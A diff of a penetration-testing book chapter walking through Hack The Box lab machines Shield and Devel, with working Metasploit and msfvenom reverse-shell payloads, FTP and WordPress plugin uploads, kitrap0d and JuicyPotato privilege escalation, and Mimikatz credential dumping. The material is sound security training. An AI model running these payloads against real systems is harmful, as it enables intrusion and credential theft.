@@ -1,10 +1,14 @@
 # Exercise: The Shield Box with Metasploit
 
-On logging in to Hack The Box, you will be presented with lots of things you can do via the dashboard. In this book, we are going to focus on the Machines that are part of the Labs environment of the site. In particular we are going to stick to Retired Machines because writeups and videos discussing approaches to these challenges are public. Remember that to get access to all of the retired machines, you will need a VIP account. A machine is an actual virtual machine that is hosted on a server located in a region that is accessible via VPN connection. You should choose a region that is close to where you live in order to get the best response times from the machines. Hack The Box has a tutorial on how to get VPN access \([https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access\](https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access\)\). Each machine will have a unique IP address and if the machine is not started already by someone else, you can start the machine and it will run for a minimum of 24 hours. If you haven't finished in that time, you can extend the length of time the machine runs by a further period. When you are ready, you can tackle the Active Machines which are ones for which there are no public writeups or videos available and you are on your own to try and solve the challenge.
+{% hint style="danger" %}
+Hack The Box has decommissioned Shield since writing this book and so it is unavailable. I have added a different box you can start with called Devel but have left the description of the walkthrough of Shield because it had Wordpress plugins which Devel didn't. If you want to skip to Devel - it is below. Credits for the Devel writeup go to Mia Blessas.
+{% endhint %}
+
+On logging in to Hack The Box, you will be presented with lots of things you can do via the dashboard. In this book, we are going to focus on the Machines that are part of the Labs environment of the site. In particular we are going to stick to Retired Machines because writeups and videos discussing approaches to these challenges are public. Remember that to get access to all of the retired machines, you will need a VIP account. A machine is an actual virtual machine that is hosted on a server located in a region that is accessible via VPN connection. You should choose a region that is close to where you live in order to get the best response times from the machines. Hack The Box has a tutorial on how to get VPN access ([https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access\\](https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access/)). Each machine will have a unique IP address and if the machine is not started already by someone else, you can start the machine and it will run for a minimum of 24 hours. If you haven't finished in that time, you can extend the length of time the machine runs by a further period. When you are ready, you can tackle the Active Machines which are ones for which there are no public writeups or videos available and you are on your own to try and solve the challenge.
 
 All Hack The Box machines present the same goals, getting a user flag which is a 32 character unique hexadecimal string. Once this is obtained, you then need to get the root flag which means getting administrator privileges on the box. In our case studies, I won't explicitly talk about getting these flags although everything we do will allow you to get and submit them.
 
-![The Hack The Box Dashboard](../.gitbook/assets/6%20%284%29.png)
+![The Hack The Box Dashboard](<../.gitbook/assets/6 (4).png>)
 
 To get started, we are going to look at a machine called Shield in the Starting Point track. This isn't the first machine in the list but it will enable us to explore some different approaches to tackling these challenges. We will go through the standard enumeration and look for an entry point into a misconfigured WordPress site. We will do this using command line tools and through the use of the amazing **Metasploit Framework**.
 
@@ -50,7 +54,7 @@ You might see an alternative of this command which is to run an initial scan to 
 
 When run, Nmap will report 2 ports open, port 80 and port 3306.
 
-```text
+```
 PORT STATE SERVICE VERSION
 80/tcp open http Microsoft IIS httpd 10.0
 | http-methods:
@@ -74,7 +78,7 @@ To explore the subdirectories and files that a website has access to, we can use
 
 Running Gobuster using the directory dictionary /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt, we discover a sub-directory of the website called wordpress indicated by the status code 301. This status code indicates to the requester that the URL has been moved permanently to another location, in this case to the URL [http://shield.htb/wordpress/](http://shield.htb/wordpress/).
 
-```text
+```
  ──[rin@parrot]─[~/boxes/StartingPoint/Shield]
 └──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/\
 directory-list-2.3-medium.txt -u http://10.10.10.29
@@ -128,7 +132,7 @@ set LHOST 10.10.14.2
 
 **LHOST** is the IP address of your attacker machine which you can get using the command “ifconfig”. After doing that, the options should look as follows:
 
-```text
+```
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > options
 Module options (exploit/unix/webapp/wp_admin_shell_upload):
  Name Current Setting Required Description
@@ -151,7 +155,7 @@ Payload options (php/meterpreter/reverse_tcp):
 
 All that remains is to type “run”. The exploit consists of uploading a plugin that consists of a php page and then calling that page. This executes a staged **Meterpreter** reverse shell. The output should be something like:
 
-```text
+```
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
 [*] Started reverse TCP handler on 10.10.14.2:4444
 [*] Authenticating with WordPress using admin:P@s5w0rd!...
@@ -175,7 +179,7 @@ That gives us a Meterpreter shell that is a little unstable and also, because it
 
 Then we can type
 
-```text
+```
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > 
     msfvenom -p windows/x64/meterpreter_reverse_tcp \
         LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
@@ -193,7 +197,7 @@ Final size of exe file: 206848 bytes
 If you have problems running msfvenom within Metasploit, you can run it from the command line in bash
 {% endhint %}
 
-Once the payload is created, we can upload it to the Shield machine.  We need to get back into the current Meterpreter session first. We do that with the sessions command. Just typing sessions will list the current sessions available. We can interact with a session using the **sessions -i &lt;session number&gt; command**:
+Once the payload is created, we can upload it to the Shield machine.  We need to get back into the current Meterpreter session first. We do that with the sessions command. Just typing sessions will list the current sessions available. We can interact with a session using the **sessions -i \<session number> command**:
 
 ```bash
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > sessions
@@ -215,7 +219,7 @@ meterpreter >
 
 Once back in the meterpreter session , we can upload the revshell.exe using the meterpreter command upload:
 
-```text
+```
 meterpreter > upload revshell.exe
 [*] uploading : revshell.exe -> revshell.exe
 [*] Uploaded -1.00 B of 202.00 KiB (-0.0%): revshell.exe -> revshell.exe
@@ -225,7 +229,7 @@ meterpreter >
 
 Before you run this shell, you want to run another exploit/multi/handler to handle the reverse shell. We need to get out of the meterpreter session to get back to the Metasploit prompt by using the background command "bg". We can then use exploit/multi/handler and set the options to match what we set for the reverse shell with msfvenom above.
 
-```text
+```
 meterpreter > bg
 [*] Backgrounding session 1...
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > use exploit/multi/handler
@@ -243,9 +247,9 @@ msf6 exploit(multi/handler) > run -j
 [*] Started reverse TCP handler on 10.10.14.3:6001
 ```
 
-Finally, we need to return to the original meterpreter session to run the new reverse shell payload. To get back to a session, you can list them with the command “sessions” and then select the session by using "sessions -i &lt;session number&gt;"
+Finally, we need to return to the original meterpreter session to run the new reverse shell payload. To get back to a session, you can list them with the command “sessions” and then select the session by using "sessions -i \<session number>"
 
-```text
+```
 msf6 exploit(multi/handler) > sessions
 Active sessions
 ===============
@@ -260,7 +264,7 @@ meterpreter >
 
 We can then just execute the meterpreter reverse shell by executing revshell.exe and waiting for the new meterpreter session to start. We then background the first session and interact with the new meterpreter session we just created.
 
-```text
+```
 meterpreter > execute -f revshell.exe
 Process 3280 created.
 meterpreter > [*] Meterpreter session 2 opened (10.10.14.3:6001 ->     
@@ -272,7 +276,7 @@ msf6 exploit(multi/handler) > sessions -i 2
 meterpreter >
 ```
 
-We are now in a new, more powerful Meterpreter session and typing help will show more commands than were available with the PHP Meterpreter shell \(not all shells are equal\). You can verify this by typing help at the Meterpreter command and seeing the range of commands available.
+We are now in a new, more powerful Meterpreter session and typing help will show more commands than were available with the PHP Meterpreter shell (not all shells are equal). You can verify this by typing help at the Meterpreter command and seeing the range of commands available.
 
 ## Discovery and Privilege Escalation
 
@@ -280,7 +284,7 @@ Now that we have achieved initial access, the process of further enumeration or 
 
 In Metasploit, you can run a command that will look for particular vulnerabilities that will lead to privilege escalation. This command is the “**local\_exploit\_suggester**”
 
-```text
+```
 meterpreter > bg
 [*] Backgrounding session 2...
 msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
@@ -317,13 +321,13 @@ local/cve_2020_1054_drawiconex_lpe.rb
 
 and change line 112 from CheckCode::NotSupported to CheckCode::Safe
 
-```text
+```
 Remove this on 112 --> return CheckCode::NotSupported
 Add this instead   --> return CheckCode::Safe("No target for win32k.sys 
                                         version #{build_num_gemversion}")
 ```
 
-  
+\
 restart Metasploit after this.
 {% endhint %}
 
@@ -336,7 +340,7 @@ JuicyPotato.exe -t * -p ^
 C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337
 ```
 
-Remember to change the path of the _**revshell.exe**_ to the actual path name Meterpreter has used. When _**JuicyPotato.exe**_ runs, it will start another _**Meterpreter**_ session but as the privileged user that the exploit has impersonated, _**NT AUTHORITY\SYSTEM**_. From there, you can cd \(change directory\) into the **c:\Users\Administrator\Desktop** directory and find the flag.
+Remember to change the path of the _**revshell.exe**_ to the actual path name Meterpreter has used. When _**JuicyPotato.exe**_ runs, it will start another _**Meterpreter**_ session but as the privileged user that the exploit has impersonated, _**NT AUTHORITY\SYSTEM**_. From there, you can cd (change directory) into the **c:\Users\Administrator\Desktop** directory and find the flag.
 
 ```bash
 meterpreter > shell
@@ -371,12 +375,12 @@ Now that we have administrator privileges, we can do some more discovery to look
 
 We will come back to this later in the book and deal with it in more details but what you will do is take advantage of a module that Meterpreter allows us to run called _**kiwi**_ that is the module that runs _**Mimikatz**_ commands. Mimikatz is a program that has been designed to search for and collect credentials on Windows from a number of different places where these are commonly stored. These include the two main sources:
 
-* Passwords stored in memory. Mimikatz looks for passwords that may be in the memory of the _**Local Security Authority Subsystem Service**_ \(_**LSASS**_\) process
-* Kerberos: Using an API to access Kerberos credentials \(tickets\) again from memory
+* Passwords stored in memory. Mimikatz looks for passwords that may be in the memory of the _**Local Security Authority Subsystem Service**_ (_**LSASS**_) process
+* Kerberos: Using an API to access Kerberos credentials (tickets) again from memory
 
 To run Kiwi, you type “load kiwi” and then “creds\_all”. From this, you can see the user “sandra” has the password “Password1234!” which has been extracted from Kerberos running on the machine.
 
-```text
+```
 meterpreter > creds_all
 [+] Running as SYSTEM
 [*] Retrieving all credentials
@@ -425,7 +429,7 @@ Visiting the Shield WordPress site at [http://shield.htb/wordpress](http://shiel
 
 Navigating to the WorPress administration site at [http://shield.htb/wordpress/wp-admin](http://shield.htb/wordpress/wp-admin), you can enter the username and password admin and P@s5w0rd! to get in and get the Dashboard page.
 
-![Successful plugin installed on Shield WordPress site](../.gitbook/assets/10%20%284%29.png)
+![Successful plugin installed on Shield WordPress site](<../.gitbook/assets/10 (4).png>)
 
 We can now call the reverse shell by entering the url
 
@@ -455,7 +459,170 @@ PS C:\inetpub\wwwroot\wordpress\wp-content\plugins\newplugin>whoami
 nt authority\iusr
 ```
 
-Although the process was more involved, we understood the process much better at the end of it and we got an initial shell that was far more robust than the PHP shell that Metasploit initially established. The way that we did the initial access in this way is more generalizable as well. We will see that we use the same approach repeatedly in different situations where we can't use Metasploit. However, there is no denying that Metasploit speeds things up and if you are working on an assignment which has time \(and cost\) pressures, Metasploit may be the way to go.
+Although the process was more involved, we understood the process much better at the end of it and we got an initial shell that was far more robust than the PHP shell that Metasploit initially established. The way that we did the initial access in this way is more generalizable as well. We will see that we use the same approach repeatedly in different situations where we can't use Metasploit. However, there is no denying that Metasploit speeds things up and if you are working on an assignment which has time (and cost) pressures, Metasploit may be the way to go.
 
 There is not necessarily a right or wrong answer when it comes to the choice of tools in most cases but knowing about a range of different approaches gives you the flexibility to select what you think is optimal for a particular situation.
 
+## Alternative Box: Devel
+
+As the Shield box is no longer available, the Devel box is another good introduction to Metasploit. It is worth reading through the Shield section to get an introduction to Wordpress Plugins, which are not covered in Devel. Again, we will use Metasploit to attain a reverse shell and escalate to root privileges. However, we will upload our shell using FTP rather than a Wordpress vulnerability. Note that this is a retired box that requires a VIP subscription to access.
+
+### Performing Nmap Scan
+
+Add a hostname for the box by adding the IP address and hostname in the /etc/hosts file. Create a directory to work in called **devel** and then add a subdirectory called **nmap** for the output of the Nmap scans.
+
+Run an Nmap scan in the terminal using the command:
+
+```bash
+nmap -Pn -v -sC -sV -p- --min-rate=1000 -T4 devel.htb -o nmap/devel-tcp-full
+```
+
+```bash
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  01:06AM       <DIR>          aspnet_client
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: IIS7
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+The box has an FTP service on port 21 that allows anonymous logins, and a web server running on port 80.
+
+Opening the URL [http://devel.htb](http://devel.htb) gives the default IIS web page.
+
+![Default IIS page on Devel machine](../.gitbook/assets/devel.png)
+
+### Check for Subdirectories
+
+At this point, we could run `gobuster` to look for subdirectories, but the ftp files shown in the nmap scan look like they could be part of the website. http://devel.htb/iistart.htm looks to be the same page that we get when we visit the root url, and `welcome.png` is the image we see.
+
+The nmap scan also shows an ftp file called `aspnet_client`, which indicates the server is running ASP.NET.
+
+We are going to create a meterpreter shell using a program called msfvenom. To start with we can use msfvenom to generate an .aspx program that will run the meterpreter reverse shell. Unlike the Shield box, the server is running ASP.NET, so we will use a .aspx payload.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=6001 -f aspx > revshell.aspx
+```
+
+Don't forget to change the LHOST (listening host) to your IP address.
+
+Now we can upload the reverse shell over FTP:
+
+```bash
+ftp> put revshell.aspx
+local: revshell.aspx remote: revshell.aspx
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+890982 bytes sent in 0.26 secs (3.3059 MB/s)
+```
+
+Now we can open Metasploit with `msfconsole` and create a handler for the reverse shell we uploaded with `use exploit/multi/handler`.
+
+```
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter_reverse_tcp
+payload => windows/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.14.6
+LHOST => 10.10.14.6
+msf6 exploit(multi/handler) > set LPORT 6001
+LPORT => 6001
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.6:6001
+```
+
+If we navigate to [http://devel.htb/revshell.aspx](http://devel.htb/revshell.aspx) we should now get a response in our metasploit window.
+
+### Discovery and Privilege Escalation
+
+Now that we have achieved initial access, the process of further enumeration or discovery takes place. We are looking for ways of elevating our user account to adminstrator and gain total ownership of the box. This process is called **privilege escalation** or **priv esc** for short.
+
+In Metasploit, you can run a command that will look for particular vulnerabilities that will lead to privilege escalation. This command is the **"local\_exploit\_suggester**". First, we need to get out of the meterpreter session to get back to the Metasploit prompt by using the background command "bg". We can then use post/multi/local\_exploit\_suggester to scan for vulnerabilities.
+
+```bash
+meterpreter > bg
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                  Information            Connection
+  --  ----  ----                  -----------            ----------
+  1         meterpreter x86/wind  IIS APPPOOL\Web @ DEV  10.10.14.6:6001 -> 10
+            ows                   EL                     .10.10.5:49194 (10.10
+                                                         .10.5)
+
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > run
+```
+
+A few options here - lets try `exploit/windows/local/ms10_015_kitrap0d`.
+
+```bash
+msf6 auxiliary(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
+lhost => tun0
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 1
+session => 1
+msf6 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.14.6:4444
+[*] Reflectively injecting payload and triggering the bug...
+[*] Launching msiexec to host the DLL...
+[+] Process 804 launched.
+[*] Reflectively injecting the DLL into 804...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Meterpreter session 2 opened (10.10.14.6:4444 -> 10.129.193.205:49158 ) at 2021-12-07 00:47:49 -0500
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+This will start another _Meterpreter_ session but as the privileged user _NT AUTHORITY/SYSTEM_. From there, you can cd (change directory) into the c:\Users\Administrator\Desktop directory and find the flag.
+
+### Inital Shell without Metasploit
+
+Instead of creating a Meterpreter shell with msfvenom, we can create a tcp shell and use **netcat** to listen for a connection.
+
+```bash
+msfconsole -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.6 LPORT=6001 -o shell.aspx
+```
+
+Upload the reverse shell in the same way as previously - by using the `put` command on the FTP server.
+
+Now start a netcat listener.
+
+```bash
+nc -lvnp 6001
+```
+
+We can start the reverse shell by navigating to [http://devel.htb/revshell.aspx](http://devel.htb/revshell.aspx) or using curl in the terminal.
+
+```bash
+curl http://devel.htb/revshell.aspx
+```
+
+```bash
+nc -lvnp 6001
+listening on [any] 6001 ...
+connect to [10.10.14.7] from (UNKNOWN) [10.10.10.5] 49157
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\web
+```
